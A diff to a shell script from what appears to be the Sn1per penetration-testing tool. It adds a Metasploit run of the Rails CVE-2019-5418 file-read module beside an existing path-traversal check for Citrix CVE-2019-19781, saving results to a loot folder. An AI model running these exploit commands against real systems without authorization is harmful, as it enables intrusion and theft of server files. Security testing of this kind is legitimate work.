@@ -221,6 +221,12 @@
       echo -e "$OKRED RUNNING CITRIX GATEWAY ARBITRARY CODE EXECUTION VULNERABILITY CVE-2019-19781 $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
       curl -vk --path-as-is https://$TARGET/vpn/../vpns/ 2>&1 | grep "You don’t have permission to access /vpns/" >/dev/null && echo "VULNERABLE: $TARGET" | tee $LOOT_DIR/output/cve-2019-19781-$TARGET-port$PORT.txt || echo "MITIGATED: $TARGET" | tee $LOOT_DIR/output/cve-2019-19781-$TARGET-port$PORT.txt
+      echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+      echo -e "$OKRED RUNNING RAILS FILE EXPOSURE EXPLOIT CVE-2019-5418 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+      msfconsole -q -x "use auxiliary/gather/rails_doubletap_file_read; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-rails_doubletap_file_read.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-rails_doubletap_file_read.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-rails_doubletap_file_read.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-rails_doubletap_file_read.raw 2> /dev/null
       if [[ "$SLACK_NOTIFICATIONS" == "1" ]]; then
             /bin/bash "$INSTALL_DIR/bin/slack.sh" "[xerosecurity.com] •?((¯°·._.• Finished Sn1per webpwn scan: $TARGET [$MODE] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
       fi
